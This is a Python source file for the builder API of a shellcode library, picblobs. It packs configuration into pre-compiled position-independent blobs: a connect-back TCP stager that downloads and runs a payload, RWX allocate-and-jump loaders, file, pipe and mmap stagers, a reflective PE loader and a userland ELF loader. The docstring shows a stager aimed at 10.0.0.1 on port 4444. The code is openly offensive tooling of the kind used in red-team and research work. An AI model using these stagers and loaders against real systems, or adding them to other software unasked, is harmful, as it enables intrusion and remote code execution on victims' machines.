"""picblobs builder API — REQ-015.

Fluent, immutable builder pattern for assembling PIC blobs. Usage:

    picblobs.Blob("linux", "x86_64").alloc_jump().payload(b"...").build()
    picblobs.Blob("linux", "aarch64").stager_tcp()
        .address("10.0.0.1").port(4444).build()
    picblobs.Blob("windows", "x86_64").reflective_pe().pe(pe_bytes).build()

Each step returns a new builder object; partial builders are reusable as
templates. ``.build()`` returns a ``bytes`` object — the pre-compiled
blob binary followed by the serialized config struct, exactly what the
C blob expects at runtime.
"""

from __future__ import annotations

import dataclasses
import socket
import struct
from typing import Any

from picblobs._enums import OS, Arch, BlobType, ValidationError

# Architectures where the blob runs big-endian. Only used by ul_exec
# which embeds the ELF header size (u32 native endianness).
_BIG_ENDIAN_ARCHES = frozenset({"mipsbe32", "s390x"})


# ---------------------------------------------------------------------------
# Internal helpers
# ---------------------------------------------------------------------------


def _assemble(blob_type: BlobType, os_: OS, arch: Arch, config: bytes) -> bytes:
    """Load the raw blob and append the config struct at config_offset."""
    from picblobs import get_blob

    try:
        blob = get_blob(blob_type.value, os_.value, arch.value)
    except FileNotFoundError as e:
        raise ValidationError(
            f"No blob staged for {blob_type.value}/{os_.value}/{arch.value}"
        ) from e

    data = bytearray(blob.code)
    if config:
        if blob.config_offset > len(data):
            data.extend(b"\x00" * (blob.config_offset - len(data)))
        # Overwrite the zero-filled config region with the caller's payload.
        data[blob.config_offset : blob.config_offset + len(config)] = config
    return bytes(data)


def _check_supported(blob_type: BlobType, os_: OS, arch: Arch) -> None:
    """Raise ValidationError with a helpful message if the combo isn't staged."""
    from picblobs._introspect import blob_types, is_supported

    if is_supported(os_, arch, blob_type):
        return
    available = ", ".join(b.value for b in blob_types(os_, arch)) or "<none>"
    raise ValidationError(
        f"{blob_type.value} is not supported for {os_.value}:{arch.value}. "
        f"Available blob types for this target: {available}"
    )


# ---------------------------------------------------------------------------
# Per-type builders. Each is frozen so setters produce a copy, not a mutation.
# ---------------------------------------------------------------------------


@dataclasses.dataclass(frozen=True)
class _BaseTypedBuilder:
    _os: OS
    _arch: Arch

    def _replace(self, **kwargs) -> _BaseTypedBuilder:
        return dataclasses.replace(self, **kwargs)

    def build_elf(self, **kwargs) -> bytes:
        """Build this blob and wrap it in a minimal Linux ELF executable.

        Keyword arguments are forwarded to :func:`picblobs.wrap_elf`.
        """
        from picblobs._elf import wrap_elf

        return wrap_elf(self.build(), self._os, self._arch, **kwargs)


@dataclasses.dataclass(frozen=True)
class HelloBuilder(_BaseTypedBuilder):
    """Hello world — no config. Useful for sanity-checking a target is wired up."""

    _blob: BlobType = BlobType.HELLO

    def build(self) -> bytes:
        _check_supported(self._blob, self._os, self._arch)
        return _assemble(self._blob, self._os, self._arch, b"")


@dataclasses.dataclass(frozen=True)
class HelloWindowsBuilder(_BaseTypedBuilder):
    """Windows hello world — no config."""

    _blob: BlobType = BlobType.HELLO_WINDOWS

    def build(self) -> bytes:
        _check_supported(self._blob, self._os, self._arch)
        return _assemble(self._blob, self._os, self._arch, b"")


@dataclasses.dataclass(frozen=True)
class AllocJumpBuilder(_BaseTypedBuilder):
    """alloc_jump — allocate RWX, copy payload, jump.

    Required: ``payload(bytes)``.
    """

    _payload: bytes | None = None

    def payload(self, data: bytes) -> AllocJumpBuilder:
        if not isinstance(data, (bytes, bytearray)):
            raise ValidationError("payload must be bytes")
        if len(data) == 0:
            raise ValidationError("payload must be non-empty")
        if len(data) > 0x10000000:
            raise ValidationError(f"payload too large: {len(data)} bytes (max 256 MiB)")
        return self._replace(_payload=bytes(data))

    def build(self) -> bytes:
        _check_supported(BlobType.ALLOC_JUMP, self._os, self._arch)
        if self._payload is None:
            raise ValidationError("alloc_jump: .payload() is required before .build()")
        config = struct.pack("<I", len(self._payload)) + self._payload
        return _assemble(BlobType.ALLOC_JUMP, self._os, self._arch, config)


@dataclasses.dataclass(frozen=True)
class StagerTcpBuilder(_BaseTypedBuilder):
    """stager_tcp — connect-back, read length-prefixed payload, jump.

    Required: ``address(str)``, ``port(int)``.
    """

    _address: str | None = None
    _port: int | None = None

    def address(self, ip: str) -> StagerTcpBuilder:
        if not isinstance(ip, str):
            raise ValidationError("address must be a string (IPv4 dotted-quad)")
        try:
            socket.inet_aton(ip)
        except OSError as e:
            raise ValidationError(f"address {ip!r} is not a valid IPv4") from e
        return self._replace(_address=ip)

    def port(self, port: int) -> StagerTcpBuilder:
        if not isinstance(port, int) or isinstance(port, bool):
            raise ValidationError("port must be int")
        if port < 1 or port > 65535:
            raise ValidationError(f"port {port} out of range (1-65535)")
        return self._replace(_port=port)

    def build(self) -> bytes:
        _check_supported(BlobType.STAGER_TCP, self._os, self._arch)
        if self._address is None:
            raise ValidationError("stager_tcp: .address() is required")
        if self._port is None:
            raise ValidationError("stager_tcp: .port() is required")
        # af=AF_INET(2), port=LE u16, addr=4 bytes network-order.
        config = struct.pack("<BH", 2, self._port) + socket.inet_aton(self._address)
        return _assemble(BlobType.STAGER_TCP, self._os, self._arch, config)


@dataclasses.dataclass(frozen=True)
class StagerFdBuilder(_BaseTypedBuilder):
    """stager_fd — read length-prefixed payload from a file descriptor.

    Required: ``fd(int)`` (defaults to 0 = stdin).
    """

    _fd: int = 0

    def fd(self, fd: int) -> StagerFdBuilder:
        if not isinstance(fd, int) or isinstance(fd, bool):
            raise ValidationError("fd must be int")
        if fd < 0 or fd > 0xFFFFFFFF:
            raise ValidationError(f"fd {fd} out of range")
        return self._replace(_fd=fd)

    def build(self) -> bytes:
        _check_supported(BlobType.STAGER_FD, self._os, self._arch)
        config = struct.pack("<I", self._fd)
        return _assemble(BlobType.STAGER_FD, self._os, self._arch, config)


@dataclasses.dataclass(frozen=True)
class StagerPipeBuilder(_BaseTypedBuilder):
    """stager_pipe — open a FIFO / named pipe path, read payload, jump.

    Required: ``path(str)``.
    """

    _path: str | None = None

    def path(self, path: str) -> StagerPipeBuilder:
        if not isinstance(path, str):
            raise ValidationError("path must be a string")
        if len(path) == 0:
            raise ValidationError("path must be non-empty")
        if len(path) >= 256:
            raise ValidationError(f"path too long: {len(path)} bytes (max 255)")
        return self._replace(_path=path)

    def build(self) -> bytes:
        _check_supported(BlobType.STAGER_PIPE, self._os, self._arch)
        if self._path is None:
            raise ValidationError("stager_pipe: .path() is required")
        path_bytes = self._path.encode("utf-8")
        config = struct.pack("<H", len(path_bytes)) + path_bytes
        return _assemble(BlobType.STAGER_PIPE, self._os, self._arch, config)


@dataclasses.dataclass(frozen=True)
class StagerMmapBuilder(_BaseTypedBuilder):
    """stager_mmap — open a file, map a segment, jump.

    Required: ``path(str)``, ``size(int)``. Optional: ``offset(int)``.
    """

    _path: str | None = None
    _offset: int = 0
    _size: int | None = None

    def path(self, path: str) -> StagerMmapBuilder:
        if not isinstance(path, str):
            raise ValidationError("path must be a string")
        if len(path) == 0:
            raise ValidationError("path must be non-empty")
        if len(path) >= 256:
            raise ValidationError(f"path too long: {len(path)} bytes (max 255)")
        return self._replace(_path=path)

    def offset(self, offset: int) -> StagerMmapBuilder:
        if not isinstance(offset, int) or isinstance(offset, bool):
            raise ValidationError("offset must be int")
        if offset < 0:
            raise ValidationError(f"offset {offset} must be non-negative")
        return self._replace(_offset=offset)

    def size(self, size: int) -> StagerMmapBuilder:
        if not isinstance(size, int) or isinstance(size, bool):
            raise ValidationError("size must be int")
        if size <= 0:
            raise ValidationError(f"size {size} must be positive")
        if size > 0x10000000:
            raise ValidationError(f"size {size} exceeds 256 MiB limit")
        return self._replace(_size=size)

    def build(self) -> bytes:
        _check_supported(BlobType.STAGER_MMAP, self._os, self._arch)
        if self._path is None:
            raise ValidationError("stager_mmap: .path() is required")
        if self._size is None:
            raise ValidationError("stager_mmap: .size() is required")
        path_bytes = self._path.encode("utf-8")
        config = (
            struct.pack("<H", len(path_bytes))
            + path_bytes
            + struct.pack("<QQ", self._offset, self._size)
        )
        return _assemble(BlobType.STAGER_MMAP, self._os, self._arch, config)


@dataclasses.dataclass(frozen=True)
class ReflectivePeBuilder(_BaseTypedBuilder):
    """reflective_pe — reflective PE loader (Windows only).

    Required: ``pe(bytes)``. Optional: ``call_dll_main(bool)``.
    """

    _pe: bytes | None = None
    _call_dll_main: bool = False

    def pe(self, data: bytes) -> ReflectivePeBuilder:
        if not isinstance(data, (bytes, bytearray)):
            raise ValidationError("pe must be bytes")
        if len(data) < 2:
            raise ValidationError("pe must be at least 2 bytes (MZ header)")
        if bytes(data[:2]) != b"MZ":
            raise ValidationError(
                "pe does not start with 'MZ' — not a valid PE/DOS image"
            )
        return self._replace(_pe=bytes(data))

    def call_dll_main(self, flag: bool) -> ReflectivePeBuilder:
        if not isinstance(flag, bool):
            raise ValidationError("call_dll_main must be bool")
        return self._replace(_call_dll_main=flag)

    def build(self) -> bytes:
        _check_supported(BlobType.REFLECTIVE_PE, self._os, self._arch)
        if self._pe is None:
            raise ValidationError("reflective_pe: .pe() is required")
        flags = 1 if self._call_dll_main else 0
        entry_type = 0  # DLL entry
        config = struct.pack("<IIB", len(self._pe), flags, entry_type) + self._pe
        return _assemble(BlobType.REFLECTIVE_PE, self._os, self._arch, config)


@dataclasses.dataclass(frozen=True)
class UlExecBuilder(_BaseTypedBuilder):
    """ul_exec — userland ELF loader.

    Required: ``elf(bytes)``. Optional: ``argv(list[str])``, ``envp(list[str])``.
    """

    _elf: bytes | None = None
    _argv: tuple[str, ...] | None = None
    _envp: tuple[str, ...] = ()

    def elf(self, data: bytes) -> UlExecBuilder:
        if not isinstance(data, (bytes, bytearray)):
            raise ValidationError("elf must be bytes")
        if len(data) < 4 or bytes(data[:4]) != b"\x7fELF":
            raise ValidationError("elf does not start with magic 0x7fELF")
        return self._replace(_elf=bytes(data))

    def argv(self, values: list[str]) -> UlExecBuilder:
        if not isinstance(values, (list, tuple)):
            raise ValidationError("argv must be a list or tuple of str")
        for v in values:
            if not isinstance(v, str):
                raise ValidationError("argv entries must be str")
        return self._replace(_argv=tuple(values))

    def envp(self, values: list[str]) -> UlExecBuilder:
        if not isinstance(values, (list, tuple)):
            raise ValidationError("envp must be a list or tuple of str")
        for v in values:
            if not isinstance(v, str):
                raise ValidationError("envp entries must be str")
        return self._replace(_envp=tuple(values))

    def build(self) -> bytes:
        _check_supported(BlobType.UL_EXEC, self._os, self._arch)
        if self._elf is None:
            raise ValidationError("ul_exec: .elf() is required")
        argv = self._argv if self._argv is not None else ("payload",)
        argv_data = b"".join(a.encode() + b"\x00" for a in argv)
        envp_data = b"".join(e.encode() + b"\x00" for e in self._envp)

        endian = ">" if self._arch.value in _BIG_ENDIAN_ARCHES else "<"
        header = struct.pack(
            f"{endian}IIIII",
            len(self._elf),
            len(argv),
            len(argv_data),
            len(self._envp),
            len(envp_data),
        )
        config = header + self._elf + argv_data + envp_data
        return _assemble(BlobType.UL_EXEC, self._os, self._arch, config)


# ---------------------------------------------------------------------------
# Top-level entry point
# ---------------------------------------------------------------------------


@dataclasses.dataclass(frozen=True)
class Blob:
    """Target-bound builder entry point.

    ``Blob(os, arch)`` creates a builder for a specific (OS, architecture)
    pair; subsequent calls pick a blob type and its config parameters.
    """

    os: OS
    arch: Arch

    def __init__(self, os: Any, arch: Any) -> None:
        object.__setattr__(self, "os", OS.parse(os))
        object.__setattr__(self, "arch", Arch.parse(arch))

    def _typed(self, cls, **kwargs) -> _BaseTypedBuilder:
        return cls(_os=self.os, _arch=self.arch, **kwargs)

    def hello(self) -> HelloBuilder:
        return self._typed(HelloBuilder)

    def hello_windows(self) -> HelloWindowsBuilder:
        if self.os is not OS.WINDOWS:
            raise ValidationError(
                f"hello_windows is Windows-only; got os={self.os.value}"
            )
        return self._typed(HelloWindowsBuilder)

    def alloc_jump(self) -> AllocJumpBuilder:
        return self._typed(AllocJumpBuilder)

    def stager_tcp(self) -> StagerTcpBuilder:
        return self._typed(StagerTcpBuilder)

    def stager_fd(self) -> StagerFdBuilder:
        return self._typed(StagerFdBuilder)

    def stager_pipe(self) -> StagerPipeBuilder:
        return self._typed(StagerPipeBuilder)

    def stager_mmap(self) -> StagerMmapBuilder:
        return self._typed(StagerMmapBuilder)

    def reflective_pe(self) -> ReflectivePeBuilder:
        if self.os is not OS.WINDOWS:
            raise ValidationError(
                f"reflective_pe is Windows-only; got os={self.os.value}"
            )
        return self._typed(ReflectivePeBuilder)

    def ul_exec(self) -> UlExecBuilder:
        return self._typed(UlExecBuilder)
